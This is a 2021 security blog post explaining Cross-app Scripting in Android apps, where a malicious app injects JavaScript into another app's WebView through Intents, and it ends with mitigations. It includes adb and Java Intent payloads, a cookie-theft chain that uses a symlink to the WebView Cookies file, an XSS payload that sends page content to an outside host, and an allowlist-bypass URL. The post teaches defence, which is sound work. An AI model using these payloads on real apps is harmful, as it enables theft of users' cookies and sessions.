---
layout: post
title: Cross-app Scripting in Android apps
date: 2021-05-10 20:45:00 +09:00
tags: tech security
---

If an Android app accepts [Intents](https://developer.android.com/reference/android/content/Intent?hl=en) to open a URL in a [WebView](https://developer.android.com/reference/android/webkit/WebView), then a malicious app installed on the same device might open a `javascript:alert(1)`-like URL, which will run the provided JavaScript in the context of the victim app's site (that is currently loaded in the WebView). This vulnerability is called [Cross-app Scripting](https://support.google.com/faqs/answer/9084685?hl=en-GB).

<!--break-->

## Background: Intents

On Android, intents are a way for an app to ask another app to do something. There are [explicit intents](https://developer.android.com/reference/android/content/Intent#intent-resolution) that specify the exact class to be run ("hey, open this place in Google Maps") or [implicit intents](https://developer.android.com/reference/android/content/Intent#intent-resolution) that only say what they want to get done and not by whom ("hey, take a photo with any app" or "open this URL in any browser"). If multiple apps offer to handle the implicit intent, Android will ask the user which app they want to use.

Intents are usually defined in the [Manifest](https://developer.android.com/guide/topics/manifest/manifest-intro), e.g.:

```
<intent-filter>
    <data android:scheme="http" />
    <data android:scheme="https" />
    <data android:host="example.com" />
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
</intent-filter>
```

One can also try to find them by looking for where they are invoked by searching for e.g. `"new Intent"` or `"import android.content.Intent;"`, e.g.:

```
final Intent switchToExternalIntent = new Intent(this, ExternalActivity.class)
    .putExtra("url", url)
    .putExtra("shareUrl", shareUrl)
    .putExtra("shareMessage", shareMessage)
startActivityForResult(switchToExternalIntent, RequestCodes.EXTERNAL_ACTIVITY_RESULT_CODE);
```

or

```
final Intent shareIntent = new Intent(Intent.ACTION_SEND);
shareIntent.setType("text/plain");
shareIntent.putExtra(Intent.EXTRA_TEXT, url);
context.startActivity(shareIntent);
```

## Calling an intent

With [adb](https://developer.android.com/studio/command-line/adb) one can call Intents directly, e.g.:

```
adb shell am start -n com.example.myapp/com.example.myapp.MainActivity -a "android.intent.action.VIEW" -d "'javascript:alert(document.cookie)'"
```

The parameters are:

* `com.example.myapp` - is the [application id](https://developer.android.com/studio/build/application-id) of the app
* `com.example.myapp.MainActivity` - the package and class name to be called (e.g. the activity's code might look like: `"package com.example.myapp; .... public class MainActivity"`)
* `android.intent.action.VIEW` is the action defined in the manifest like `<action android:name="android.intent.action.VIEW" />` (sometimes it works without specifying this)
* `-d` sets the data

`adb` is ideal for testing, however let's not forget that a real-life malicious app would send the same Intent from Java like this:

```
Intent i = new Intent();
i.setAction("android.intent.action.VIEW");
i.setClassName("com.example.myapp","com.example.myapp.MainActivity");
i.setData(Uri.parse("javascript:alert(document.cookie)"));
startActivity(i);
```

### Extras

In addition to the main data of an Intent, extra parameters can be passed either via the `putExtra()` Java call or with the `--eX` flags of `abd` depending on the type of the data:

* `--es` for string
* `--eu` for URI
* `--ez` for boolean
* `--ei` for integer
* `--el` for long
* `--ef` for float

More options: [https://developer.android.com/studio/command-line/adb#IntentSpec](https://developer.android.com/studio/command-line/adb#IntentSpec)

Example:

```
adb shell am start -n "com.example.myapp/com.example.myapp.MainActivity" --es url "javascript:alert\(document.cookie\)" --es "app.subject_id" "1234" --eu "android.intent.extra.REFERRER" "android-app:\/\/com.example.myapp"
```

Same in Java:

```
Intent i = new Intent();
i.setAction("android.intent.action.VIEW");
i.setClassName("com.example.myapp","com.example.myapp.MainActivity");
i.putExtra(Intent.EXTRA_REFERRER, Uri.parse("android-app://com.example.myapp"));
i.putExtra("app.subject_id", 1234);
i.putExtra("url","javascript:alert(document.cookie)");
startActivity(i);
```

## Referer-spoofing

Intents can contain an [EXTRA_REFERRER](https://developer.android.com/reference/android/content/Intent#EXTRA_REFERRER) field, and it seems reasonable to check that to ensure only trusted apps can send requests to our app, however this parameter can be easily spoofed by a malicious app (as shown above).

## Impact: I have all your cookies

The impact of [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) is generally reduced by the [`httpOnly` cookie flag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies), however there is a clever trick to bypass this and get all cookies from a WebView. (This is mentioned in [Google's description](https://support.google.com/faqs/answer/9084685?hl=en-GB) too.)

A WebView uses it's own set of cookies that are stored in the `/data/data/package_name/app_webview/Cookies` SQLite file. As this is in the [app's own folder, it is only accessible by the app itself](https://source.android.com/security/app-sandbox).

The attack works like this:

1. The malicious app opens a malicios site within the victim app's WebView
2. This site creates a cookie for it's own domain and sets the cookie value to an XSS payload, e.g. `<img src=x onerror='this.src = "https://example.com/?" + encodeURIComponent(document.getElementsByTagName("html")[0].innerHTML)'>` (this takes the entire page and sends it to an external site)
3. This cookie gets stored in `/data/data/package_name/app_webview/Cookies` along with all the other cookies (this might take a few seconds, so the malicious app might need to wait up to 20-30 seconds)
4. The malicious app creates a symlink to this file, e.g. `ln -s /data/data/package_name/app_webview/Cookies /tmp/symlink.html` (even though the malicous app can't access the cookies file directly, it can make the symlink)
5. The malicious app opens `file:///tmp/symlink.html` in the WebView. Since the Cookies file is owned by the app, it can access it.
6. Since the file extension is html, the WebView will look for any HTML code and interpret it as such. The file is an SQLite database file, so it has a lot of non-ASCII bytes, however the cookie values appear in clear text, thus the HTML code injected in step 2 runs.
7. The injected JavaScript takes the entire content of the file and sends it to an external server. This contains all cookies from the WebView.

The mobile security concept is very different from the desktop: on desktop if a user runs a malicious app, that's (almost) game over (e.g. they can usually start a keylogger, steal the browser's cookie jars etc.). On mobile however it is expected that apps and user data is protected even against a malicious app (e.g. see the fine-tuned permission system). To exploit an intent-based issue, the attacker needs to convince the user to install the attacker's app on their phone, which does reduce the risk, however because of the expectation of apps being separated, we generally still need to consider (and fix) these issues.

## Solution 1: disable calling intents from other apps

This is the [first recommendation by Google](https://support.google.com/faqs/answer/9084685?hl=en-GB) too:

> Find any [Activities](https://developer.android.com/reference/android/app/Activity) with affected [WebViews](https://developer.android.com/reference/android/webkit/WebView). If these [Activities](https://developer.android.com/reference/android/app/Activity) do not need to take [Intents](https://developer.android.com/reference/android/content/Intent) from other apps you can set [android:exported=false](https://developer.android.com/guide/topics/manifest/activity-element#exported) for the [Activities](https://developer.android.com/reference/android/app/Activity) in your [Manifest](https://developer.android.com/guide/topics/manifest/manifest-intro). This ensures that malicious apps cannot send harmful inputs to any [WebViews](https://developer.android.com/reference/android/webkit/WebView) in these activities.

However sometimes this is not an option, e.g. some apps send push notifications to the user, and uppon clicking on those, they send an Intent to the app asking it to open a specific page in the app's WebView showing e.g. a promotion.

## Solution 2: only open trusted links

Have an allowlist of domains and check that the URL from the Intent starts with the entire domain, e.g. `https://example.com/`. The trailing `/` is important, otherwise `https://example.com.attacker.com` would be accepted.

### Accepting any subdomains

If all subdomains of a trusted domain need to be accepted, it's tempting to parse the URL and then ensure that the hostname ends with `.example.com` (leading `.` is important, otherwise `attackerexample.com` would be accepted). However make sure to check the protocol too, otherwise this might get accepted: `javascript://mysite.example.com/%0aalert(1)`. But more on this trick in an other post.
